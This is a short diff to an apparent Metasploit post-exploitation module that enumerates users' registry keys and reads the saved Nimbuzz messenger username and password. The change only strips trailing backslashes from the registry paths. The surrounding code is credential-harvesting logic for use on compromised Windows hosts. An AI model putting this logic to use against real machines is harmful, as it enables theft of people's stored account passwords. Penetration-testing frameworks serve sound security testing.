@@ -48,15 +48,15 @@ class MetasploitModule < Msf::Post
       next if k.include?('_Classes')
 
       vprint_status("Looking at Key #{k}")
-      subkeys = registry_enumkeys("HKU\\#{k}\\Software\\Nimbuzz\\")
+      subkeys = registry_enumkeys("HKU\\#{k}\\Software\\Nimbuzz")
 
       if subkeys.nil? || (subkeys == '')
         print_status('Nimbuzz Instant Messenger not installed for this user.')
         next
       end
 
-      user = registry_getvaldata("HKU\\#{k}\\Software\\Nimbuzz\\PCClient\\Application\\", 'Username') || ''
-      hpass = registry_getvaldata("HKU\\#{k}\\Software\\Nimbuzz\\PCClient\\Application\\", 'Password')
+      user = registry_getvaldata("HKU\\#{k}\\Software\\Nimbuzz\\PCClient\\Application", 'Username') || ''
+      hpass = registry_getvaldata("HKU\\#{k}\\Software\\Nimbuzz\\PCClient\\Application", 'Password')
 
       next if hpass.nil? || (hpass == '')
 
